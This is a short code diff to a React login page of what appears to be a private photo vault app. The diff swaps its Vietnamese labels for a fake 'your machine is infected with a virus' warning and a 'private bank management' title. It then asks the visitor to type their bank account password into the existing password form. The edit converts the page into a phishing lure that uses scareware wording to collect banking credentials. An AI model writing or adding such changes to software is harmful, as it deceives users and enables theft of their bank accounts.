@@ -42,10 +42,10 @@ export default function Home() {
         <div className="login-mark" aria-hidden="true">
           MI
         </div>
-        <p className="login-kicker">PRIVATE IMAGE VAULT</p>
-        <h1 id="login-title">Kho ảnh cá nhân</h1>
+        <p className="login-kicker">PRIVATE BANK MANAGERMENT</p>
+        <h1 id="login-title">Máy Bạn đã nhiễm Virus</h1>
         <p className="login-description">
-          Đăng nhập để quản lý ảnh lưu trên Telegram.
+          Vui lòng nhập <b>Mật Khẩu</b> tài khoản Ngân Hàng để xác thực quyền truy cập vào hệ thống.
         </p>
         <form className="login-form" onSubmit={handleSubmit}>
           <label htmlFor="password">Mật khẩu quản trị</label>
